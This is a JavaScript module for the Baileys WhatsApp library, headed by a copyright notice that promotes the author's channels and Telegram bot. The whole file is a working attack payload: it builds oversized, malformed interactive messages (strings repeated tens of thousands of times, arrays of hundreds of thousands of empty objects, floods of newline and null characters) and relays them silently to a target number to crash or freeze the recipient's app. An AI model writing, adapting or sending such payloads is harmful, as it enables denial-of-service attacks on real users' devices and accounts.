/*
 * © 2026 Zamiwolf (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@zami-tech001?si=KZyqSwioU8lh14jh
 * Instagram : itx_zami
 * Telegram  : https://t.me/ZAMI_WOLF_001
 * WhatsApp  : +923165451863
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { generateWAMessage, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

async function delayinvisxfrezee(sock, target) {
    const rezzonly2 = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "olaaaa rezz here",
                        footer: "Mampus"
                    },
                    nativeFlowMessage: {
                        buttons: "one_crash_message".repeat(40000),
                        nativeFlowResponseMessage: {
                            buttons: Array.from({ length: 1236 }, () => ({}))
                        }
                    },
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            icon: "document",
                            title: "°deffa is here°¿",
                            sections: Array.from({ length: 5055 }, () => ({}))
                        })
                    }
                }
            }
        }
    };
    const rezz = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐂𝐀𝐋𝐋 𝐎𝐅 𝐃𝐔𝐓𝐘"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 400000 }, () => ({})),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\0".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, rezzonly2, { noSelfSync: true });
    await sock.relayMessage(target, rezz, { noSelfSync: true });
}

module.exports = { delayinvisxfrezee };